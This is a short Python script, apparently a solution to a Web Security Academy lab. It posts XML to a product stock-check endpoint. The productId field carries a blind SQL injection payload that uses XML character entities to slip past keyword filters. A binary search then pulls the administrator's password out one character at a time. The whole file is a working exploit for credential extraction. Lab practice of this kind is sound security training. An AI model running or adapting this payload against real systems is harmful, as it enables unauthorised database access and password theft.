import requests

url = 'https://0a0b0079031c191e82704c730094004f.web-security-academy.net/product/stock'

def sqli(pos, mid):
    # 502 => true
    # 807 => false

    xml_data = '''<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>(&#x53;elect CASE WHEN ( ascii(substring((&#x53;elect password from users where username like&#x27;administrator&#x27;),%i,1)) > %i ) THEN 1 ELSE 2 END)</productId>
        <storeId>1</storeId>
    </stockCheck>'''  % (pos,mid)

    headers = {
        'Content-Type': 'application/xml'
    }

    r = requests.post(url, data=xml_data, headers=headers)
    #print(r.text)
    return int(r.text.split(' ')[0]) == 502

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag = ''
for i in range(1, 30):
    flag += get_char(i)
    print(flag)